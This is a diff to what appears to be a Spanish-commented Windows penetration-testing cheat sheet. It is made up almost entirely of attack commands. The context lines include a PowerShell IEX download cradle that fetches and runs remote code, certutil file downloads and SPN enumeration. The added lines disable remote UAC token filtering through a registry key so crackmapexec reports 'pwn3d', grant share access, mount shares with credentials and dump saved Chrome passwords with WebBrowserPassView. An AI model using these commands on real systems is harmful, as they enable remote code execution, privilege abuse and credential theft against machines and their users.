@@ -32,6 +32,7 @@ powershell.exe -ep -Bypass -nop -noexit -c IEX"(New-Object Net.WebClient).downlo
 powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')"
 Invoke-WebRequest "http://ip/file" -OutFile "c:\Users\file"
 certutil.exe -f -urlcache -split http://ip/file file
+wget URL -UseBasicParsing -OutFile FILE
 
 # copiar archivos via compartida
 copy \\IP\SHARE\FILE FILE
@@ -144,3 +145,13 @@ setspn.exe -T medin -Q */* #extract all users in SPN
 
 # Console_history
 ConsoleHost_Historyta\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+# Habilitar pwn3d (crackmapexec)
+net share COMPARTIDA=C:\Windows\Temp /GRANT:Administrators,FULL
+cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v  LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+# montar compartida con usuario + contraseña via CMD
+net use \\samba\compartida password /USER:username
+
+# WebBrowserPassView
+WebBrowserPassView.exe /UseChromeProfileFolder 1 /ChromeProfileFolder "C:\Users\User\AppData\Local\Google\Chrome\User Data"
